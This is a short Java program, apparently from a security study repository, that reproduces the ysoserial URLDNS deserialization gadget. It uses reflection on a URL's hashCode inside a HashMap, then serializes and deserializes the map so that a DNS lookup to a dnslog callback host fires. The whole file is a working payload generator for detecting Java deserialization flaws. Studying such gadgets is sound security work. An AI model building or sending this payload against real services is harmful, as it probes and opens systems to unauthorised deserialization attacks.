package org.su18.serialize.ysoserial.URLDNS;

import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/**
 * 多次通过反射修改 URL hashCode 的值，避免在 HashMap put 时触发 hash 方法调用 URL 的 hashCode 触发漏洞
 *
 * @author su18
 */
public class URLDNS {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL                   url     = new URL("http://su18.dnslog.cn");
		Field                 f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);

		f.set(url, 0x01010101);
		hashMap.put(url, 0);
		f.set(url, -1);

		SerializeUtil.writeObjectToFile(hashMap);
		SerializeUtil.readFileObject();
	}
}